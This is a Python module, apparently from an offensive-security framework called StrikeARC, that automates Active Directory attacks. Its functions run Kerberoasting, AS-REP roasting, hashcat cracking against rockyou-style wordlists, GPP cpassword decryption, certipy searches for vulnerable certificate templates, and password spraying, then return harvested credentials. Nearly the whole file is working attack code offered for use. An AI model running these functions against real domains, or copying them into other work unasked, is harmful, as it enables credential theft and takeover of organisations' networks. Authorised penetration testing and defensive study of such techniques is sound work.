#!/usr/bin/env python3
"""AD Attack Execution — Kerberoasting, AS-REP roasting, GPP decrypt, ADCS ESC.

Closes the biggest StrikeARC gap (ad_enum.py is enumeration-only by design):
turns the AD vectors that previously existed as advisory strings into
executable techniques using the now-installed tooling
(impacket-GetUserSPNs/GetNPUsers, hashcat, nxc, certipy, impacket-Get-GPPPassword).

Every function:
  - takes explicit params (no hardcoded lab values),
  - gates on tool availability (shutil.which) and degrades to an advisory
    dict instead of raising,
  - returns {"status": success|failed|advisory|error, ...} for graph consumption.

Vault sources (~/Documents/Purple-Teaming):
  - AD/11 Kerberoasting from Linux, AD/12 from Windows
  - AD/06 Password Spraying (lockout awareness)
  - AD/05 LLMNR/NBT-NS, AD/09 ACL abuse, AD/16 Bleeding Edge (ADCS ESC)
  - Password Attacks/ (hashcat mode map, custom wordlists)
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile

# hashcat mode per hash type (from Password Attacks module)
HASHCAT_MODES = {
    "krb5tgs": 13100,     # Kerberoast (TGS-REP)
    "krb5asrep": 18200,   # AS-REP roast
    "ntlm": 1000,         # NTLM
    "ntlmv2": 5600,       # NTLMv2 (responder captures)
    "sam": 1000,
    "mscash": 1100,       # MS-Cache-V1 (DCC)
    "mscash2": 2100,      # MS-Cache-V2 (DCC2)
    "netntlm": 5500,
}

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
FALLBACK_WORDLISTS = [
    DEFAULT_WORDLIST,
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
    "/usr/share/seclists/Passwords/corporate_passwords.txt",
    "/usr/share/wordlists/fasttrack.txt",
]


def _tool(name: str) -> str | None:
    return shutil.which(name)


def _run(cmd: list, timeout: int = 300) -> dict:
    """Run a command list (no shell) and capture output."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except subprocess.TimeoutExpired:
        return {"rc": -1, "out": "", "err": f"timeout after {timeout}s"}
    except OSError as e:
        return {"rc": -1, "out": "", "err": str(e)}


def _best_wordlist() -> str | None:
    for w in FALLBACK_WORDLISTS:
        if os.path.exists(w):
            return w
    return None


def _write_temp(data: str, suffix: str = ".txt") -> str:
    fd, path = tempfile.mkstemp(prefix="strikearc_", suffix=suffix)
    with os.fdopen(fd, "w") as fh:
        fh.write(data)
    return path


# ---------------------------------------------------------------------------
# Kerberoasting
# ---------------------------------------------------------------------------

def kerberoast(domain: str, dc_ip: str, username: str = "", password: str = "",
               hash_format: str = "hashcat", timeout: int = 300) -> dict:
    """impacket-GetUserSPNs -request -dc-ip <dc> domain.user:pass"""
    tool = _tool("impacket-GetUserSPNs")
    if not tool:
        return {"status": "advisory", "reason": "impacket-GetUserSPNs not installed",
                "manual": f"impacket-GetUserSPNs -request -dc-ip {dc_ip} -hashes :LM:NT '{domain}'/<user>:<pass>"}
    if not (username and password):
        return {"status": "error", "reason": "credentials required for kerberoasting"}
    auth = f"{domain}/{username}:{password}"
    cmd = [tool, "-request", "-dc-ip", dc_ip, "-format", hash_format, auth]
    r = _run(cmd, timeout)
    hashes = re.findall(r"\$krb5tgs\$[^\s]+", r["out"])
    if hashes:
        hf = _write_temp("\n".join(hashes))
        return {"status": "success", "hashes_file": hf, "hash_count": len(hashes),
                "hashcat_mode": HASHCAT_MODES["krb5tgs"], "raw": r["out"][:2000]}
    return {"status": "failed", "reason": "no TGS hashes returned",
            "raw": (r["out"] + r["err"])[:1500]}


def asrep_roast(domain: str, dc_ip: str, users_file: str = "", timeout: int = 300) -> dict:
    """impacket-GetNPUsers — no creds needed if user list supplied."""
    tool = _tool("impacket-GetNPUsers")
    if not tool:
        return {"status": "advisory", "reason": "impacket-GetNPUsers not installed",
                "manual": f"impacket-GetNPUsers -no-pass -dc-ip {dc_ip} -usersfile users.txt {domain}/"}
    if not users_file or not os.path.exists(users_file):
        return {"status": "error", "reason": "users_file required (from ad_enum user list)"}
    cmd = [tool, "-no-pass", "-dc-ip", dc_ip, "-usersfile", users_file, f"{domain}/"]
    r = _run(cmd, timeout)
    hashes = re.findall(r"\$krb5asrep\$[^\s]+", r["out"])
    if hashes:
        hf = _write_temp("\n".join(hashes))
        return {"status": "success", "hashes_file": hf, "hash_count": len(hashes),
                "hashcat_mode": HASHCAT_MODES["krb5asrep"], "raw": r["out"][:2000]}
    return {"status": "failed", "reason": "no AS-REP hashes (no preauth-free users?)",
            "raw": (r["out"] + r["err"])[:1500]}


# ---------------------------------------------------------------------------
# Cracking
# ---------------------------------------------------------------------------

def crack_hashes(hashes_file: str, hash_type: str = "krb5tgs",
                 wordlist: str = "", timeout: int = 900,
                 rules: str = "best64") -> dict:
    """hashcat with auto mode selection; falls back through wordlists."""
    tool = _tool("hashcat")
    if not tool:
        return {"status": "advisory", "reason": "hashcat not installed",
                "manual": f"hashcat -m {HASHCAT_MODES.get(hash_type, 0)} {hashes_file} <wordlist>"}
    if hash_type not in HASHCAT_MODES:
        return {"status": "error", "reason": f"unknown hash type {hash_type}"}
    wl = wordlist or _best_wordlist()
    if not wl:
        return {"status": "advisory", "reason": "no wordlist found (rockyou/seclists)",
                "manual": "download rockyou or pass wordlist="}
    mode = HASHCAT_MODES[hash_type]
    cmd = [tool, "-m", str(mode), hashes_file, wl, "--potfile-disable", "-r", rules,
           "-o", hashes_file + ".cracked", "--quiet"]
    r = _run(cmd, timeout)
    cracked = []
    if os.path.exists(hashes_file + ".cracked"):
        with open(hashes_file + ".cracked") as fh:
            cracked = [line.strip() for line in fh if line.strip()]
    if cracked:
        # hash:plain → credential dicts
        creds = []
        for line in cracked:
            if ":" in line:
                h, plain = line.split(":", 1)
                creds.append({"hash": h, "password": plain, "source": f"hashcat m{mode}"})
        return {"status": "success", "credentials": creds, "wordlist": wl, "mode": mode}
    return {"status": "failed", "reason": "no hashes cracked",
            "wordlist": wl, "raw": (r["out"] + r["err"])[:1000]}


# ---------------------------------------------------------------------------
# GPP passwords
# ---------------------------------------------------------------------------

def gpp_decrypt(gpp_file: str = "", smb_share_path: str = "", timeout: int = 120) -> dict:
    """impacket-Get-GPPPassword: fetch+decrypt cpassword from SYSVOL XML."""
    tool = _tool("impacket-Get-GPPPassword")
    if not tool:
        return {"status": "advisory", "reason": "impacket-Get-GPPPassword not installed"}
    if gpp_file and os.path.exists(gpp_file):
        # local XML already pulled (e.g. via SMB share enum)
        r = _run([tool, "-xmlfile", gpp_file], timeout)
    elif smb_share_path:
        r = _run([tool, "-share", smb_share_path], timeout)
    else:
        return {"status": "error", "reason": "need gpp_file or smb_share_path"}
    creds = re.findall(r"([^\s:]+):([^\s:]+)", r["out"])
    found = [{"username": u, "password": p, "source": "GPP cpassword"} for u, p in creds
             if "password" not in u.lower() or ":" in u]
    if found or "cpassword" in r["out"].lower():
        return {"status": "success" if found else "failed", "credentials": found,
                "raw": r["out"][:1500]}
    return {"status": "failed", "reason": "no cpassword entries", "raw": r["out"][:1000]}


# ---------------------------------------------------------------------------
# ADCS / ESC
# ---------------------------------------------------------------------------

def adcs_find(domain: str, dc_ip: str, username: str = "", password: str = "",
              timeout: int = 300) -> dict:
    """certipy find — vulnerable template discovery (ESC1-ESC13)."""
    tool = _tool("certipy")
    if not tool:
        return {"status": "advisory", "reason": "certipy not installed",
                "manual": f"certipy find -dc-ip {dc_ip} -u {username}@{domain} -p <pass> -vulnerable"}
    if not (username and password):
        return {"status": "error", "reason": "credentials required for certipy find"}
    out_json = os.path.join(tempfile.gettempdir(), f"certipy_{dc_ip}.json")
    cmd = [tool, "find", "-dc-ip", dc_ip, "-u", f"{username}@{domain}", "-p", password,
           "-vulnerable", "-json", "-output", out_json.removesuffix(".json")]
    r = _run(cmd, timeout)
    data = None
    if os.path.exists(out_json):
        import json as _json
        try:
            with open(out_json) as fh:
                data = _json.load(fh)
        except (OSError, ValueError):
            pass
    vuln_templates = []
    if isinstance(data, dict):
        for ca_name, ca in (data.get("Certificate Authorities") or {}).items():
            for tpl_name, tpl in (ca.get("Templates") or {}).items() if isinstance(ca, dict) else []:
                escs = [k for k in (tpl or {}) if k.startswith("ESC") and str(tpl[k]).lower() in ("true", "yes", "1")]
                if escs:
                    vuln_templates.append({"template": tpl_name, "ca": ca_name, "escs": escs})
    # fallback: parse text
    if not vuln_templates:
        vuln_templates = [{"template": m.group(1), "escs": ["detected"]}
                          for m in re.finditer(r"ESC\d+.*?'?([\w\s\-]+)'?", r["out"]) if m.group(1).strip()]
    if vuln_templates:
        return {"status": "success", "vulnerable_templates": vuln_templates,
                "json_file": out_json if os.path.exists(out_json) else None}
    return {"status": "failed", "reason": "no vulnerable templates (or parse failed)",
            "raw": r["out"][:1500]}


# ---------------------------------------------------------------------------
# Password spraying (lockout-aware)
# ---------------------------------------------------------------------------

def password_spray(domain: str, dc_ip: str, users_file: str, password: str,
                   protocol: str = "smb", timeout: int = 600) -> dict:
    """nxc spray — one password against many users, lockout-aware via policy."""
    tool = _tool("nxc")
    if not tool:
        tool = _tool("crackmapexec")
    if not tool:
        return {"status": "advisory", "reason": "netexec/crackmapexec not installed"}
    cmd = [tool, protocol, dc_ip, "-u", users_file, "-p", password, "--continue-on-success"]
    r = _run(cmd, timeout)
    valid = re.findall(r"\[\+\] ([^\s]+)\s+\d+\.\d+\.\d+\.\d+.*?\[([^\]]+)\]", r["out"])
    creds = [{"username": u, "password": password, "source": f"{os.path.basename(tool)} spray"}
             for u, status in valid if "pwned" in status.lower() or "(status" in status]
    return {"status": "success" if creds else "failed",
            "credentials": creds, "raw": r["out"][:2000]}


# ---------------------------------------------------------------------------
# Entry point used by exploit dispatch
# ---------------------------------------------------------------------------

def execute_ad_vector(vector: dict, context: dict) -> dict:
    """Dispatch an AD attack vector (vector_type → function).

    context: {domain, dc_ip, username, password, users_file, hashes_file, gpp_file}
    """
    vt = vector.get("vector_type", "")
    domain = context.get("domain", "")
    dc_ip = context.get("dc_ip", "")
    if vt == "kerberoast":
        return kerberoast(domain, dc_ip, context.get("username", ""), context.get("password", ""))
    if vt == "asrep_roast":
        return asrep_roast(domain, dc_ip, context.get("users_file", ""))
    if vt in ("adcs_esc", "adcs"):
        return adcs_find(domain, dc_ip, context.get("username", ""), context.get("password", ""))
    if vt == "gpp_password":
        return gpp_decrypt(gpp_file=context.get("gpp_file", ""),
                           smb_share_path=context.get("smb_share_path", ""))
    if vt in ("password_spray", "spray"):
        return password_spray(domain, dc_ip, context.get("users_file", ""),
                              context.get("password", ""))
    return {"status": "error", "reason": f"unknown AD vector type: {vt}"}


# ---------------------------------------------------------------------------
# Self-test (no network): tool gating + hashcat mode map + regex quality
# ---------------------------------------------------------------------------

def _selftest() -> int:
    ok = True
    # 1. tool gating advisory path
    r = kerberoast("x.com", "10.0.0.1", "u", "p")
    if shutil.which("impacket-GetUserSPNs"):
        ok &= r["status"] in ("success", "failed")
    else:
        ok &= r["status"] == "advisory"
    # 2. missing-cred error path
    r = asrep_roast("x.com", "10.0.0.1")
    ok &= r["status"] == "error"
    # 3. hashcat mode map
    ok &= HASHCAT_MODES["krb5tgs"] == 13100 and HASHCAT_MODES["krb5asrep"] == 18200
    # 4. kerberoast hash regex
    fake = "bla $krb5tgs$23$*user$DOMAIN$svc/test*$hash$"
    ok &= len(re.findall(r"\$krb5tgs\$[^\s]+", fake)) == 1
    # 5. wordlist discovery
    wl = _best_wordlist()
    print(f"[selftest] wordlist: {wl}")
    # 6. dispatch unknown vector
    r = execute_ad_vector({"vector_type": "nope"}, {})
    ok &= r["status"] == "error"
    print("[selftest] PASS" if ok else "[selftest] FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    import sys
    if "--selftest" in sys.argv:
        raise SystemExit(_selftest())
    print(__doc__)
